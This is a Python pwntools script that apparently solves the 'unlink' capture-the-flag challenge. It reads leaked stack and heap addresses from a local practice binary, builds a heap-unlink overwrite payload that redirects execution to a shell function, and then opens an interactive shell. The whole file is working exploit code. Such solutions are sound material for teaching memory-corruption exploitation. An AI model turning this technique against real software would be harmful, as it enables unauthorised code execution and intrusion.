import struct
from pwn import *

def p32(x):
    return struct.pack("<I", x)

# Set context for the binary
context.binary = '/home/unlink/unlink'
# context.log_level = 'debug'

program = process('/home/unlink/unlink')

content = program.recvuntil(b'get shell!\n').decode()

shell_function = 0x080484eb

line1 = content.split('\n')[0]
line2 = content.split('\n')[1]

stack_address = line1.split("leak: ")[-1]  # Assuming the format "leak: 0x..."
heap_address = line2.split("leak: ")[-1]  # Assuming the format "leak: 0x..."

stack_address = int(stack_address[2:], 16)
heap_address = int(heap_address[2:], 16)

payload = b'JUNK' * 4

payload += p32(heap_address + 0x24) 
payload += p32(stack_address + 0x10) 
payload += p32(shell_function) 

# print("payload is: ", payload)

program.send(payload)

program.interactive()
